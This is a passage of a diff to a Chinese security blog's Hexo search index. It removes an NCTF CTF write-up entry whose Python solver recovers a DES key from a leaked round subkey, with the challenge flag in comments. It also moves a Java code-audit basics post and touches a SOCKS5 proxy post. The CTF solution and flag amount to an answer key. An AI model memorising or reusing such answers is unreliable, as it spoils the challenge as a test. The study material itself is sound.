class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NCTF&#x27;</span> <span class="hljs-keyword">in</span> m:<br>                <span class="hljs-built_in">print</span>(m)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        revkeys[l[index]] = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span>(rec(index + <span class="hljs-number">1</span>)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            revkeys[l[index]] = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> rec(index + <span class="hljs-number">1</span>)<br>      <br><span class="hljs-comment"># 测试部分代码</span><br><span class="hljs-comment"># key = &quot;02244668&quot;</span><br><span class="hljs-comment"># flag = &quot;NCTF&#123;1t_7urn3d_0u7_7h47_u_2_g00d_@_r3v3rs3_1snt&#125;&quot;</span><br><span class="hljs-comment"># des = pyDes.des(key)</span><br><span class="hljs-comment"># cipher = des.encrypt(flag.encode())</span><br><span class="hljs-comment"># kn10 = des.Kn[10]</span><br><span class="hljs-comment"># print(cipher)</span><br><br>cipher = base64.b64decode(<span class="hljs-string">b&#x27;m0pT2YYUIaL0pjdaX2wsxwedViYAaBkZA0Rh3bUmNYVclBlvWoB8VYC6oSUjfbDN&#x27;</span>)<br>kn10 = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]<br><br>revkeys = rev_subkeys(kn10,<span class="hljs-number">10</span>)<br><br>l = []<br><span class="hljs-keyword">for</span> idx,i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(revkeys):<br>    <span class="hljs-keyword">if</span>(i == <span class="hljs-number">2</span>):<br>        l.append(idx)<br><br>key = <span class="hljs-string">&quot;&quot;</span><br>rec(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
-<p>推荐WP：<br />
-<a href="https://blog.csdn.net/m0_57291352/article/details/119280470">NCTF-REVERSE-WP</a></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>Crypto</category>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>wp</tag>
-        <tag>NSS</tag>
-        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -2596,38 +2498,6 @@ m  &amp;= A^{-1}c
       </tags>
   </entry>
   <entry>
-    <title>Java代码审计（二） Java SE基础学习</title>
-    <url>/2023/09/04/blog0033-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89-Java-SE%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>上一节，主要记录了IDEA配置基础的Java项目，属于相对比较繁琐的内容。</p>
-<p>这一节，将会针对Java SE的基础语法进行说明。网络上已经有很多非常成熟的Java SE的博客，因此这一篇将不会过多关注Java SE开发入门的相关内容。</p>
-<p>留篇在此也是为了后续相关的备忘，或者后续有关于Java 底层相关内容的深入讨论也可以在这里做一个集合。</p>
-<span id="more"></span>
-<h2 id="一入门博客">一、入门博客</h2>
-<p>Java常见的开发教程非常多，推荐如下：</p>
-<p><a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程 Java入门</a></p>
-<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744">廖雪峰 Java入门教程</a></p>
-<h2 id="二基础补充">二、基础补充</h2>
-<p>这一部分主要是介绍一些trick，并不涉及非常具体底层的技术细节。</p>
-<h3 id="变量命名">1.变量命名</h3>
-<p>很多博客里都不会提到的Java标识符命名规范：</p>
-<ol type="1">
-<li>可以使用数字、字母、下划线以及<code>$</code>作为变量命名的组成</li>
-<li>不能以数字开头</li>
-<li>区分大小写</li>
-</ol>
-<p>补充这个点主要可以在Java命名<code>$_POST</code>这样的PHP形式变量，感觉非常有意思。</p>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>notes</tag>
-        <tag>Code Audit</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>danted socks5代理服务器配置</title>
     <url>/2023/09/06/blog0034-danted-socks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
     <content><![CDATA[<p>最近研究了一下如何搭建socks5代理服务器，选择了danted做了一些分析。</p>
@@ -2673,6 +2543,38 @@ m  &amp;= A^{-1}c
         <tag>代理</tag>
         <tag>socks5</tag>
         <tag>服务器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java代码审计（二） Java SE基础学习</title>
+    <url>/2023/09/04/blog0033-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89-Java-SE%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>上一节，主要记录了IDEA配置基础的Java项目，属于相对比较繁琐的内容。</p>
+<p>这一节，将会针对Java SE的基础语法进行说明。网络上已经有很多非常成熟的Java SE的博客，因此这一篇将不会过多关注Java SE开发入门的相关内容。</p>
+<p>留篇在此也是为了后续相关的备忘，或者后续有关于Java 底层相关内容的深入讨论也可以在这里做一个集合。</p>
+<span id="more"></span>
+<h2 id="一入门博客">一、入门博客</h2>
+<p>Java常见的开发教程非常多，推荐如下：</p>
+<p><a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程 Java入门</a></p>
+<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744">廖雪峰 Java入门教程</a></p>
+<h2 id="二基础补充">二、基础补充</h2>
+<p>这一部分主要是介绍一些trick，并不涉及非常具体底层的技术细节。</p>
+<h3 id="变量命名">1.变量命名</h3>
+<p>很多博客里都不会提到的Java标识符命名规范：</p>
+<ol type="1">
+<li>可以使用数字、字母、下划线以及<code>$</code>作为变量命名的组成</li>
+<li>不能以数字开头</li>
+<li>区分大小写</li>
+</ol>
+<p>补充这个点主要可以在Java命名<code>$_POST</code>这样的PHP形式变量，感觉非常有意思。</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>notes</tag>
+        <tag>Code Audit</tag>
       </tags>
   </entry>
   <entry>
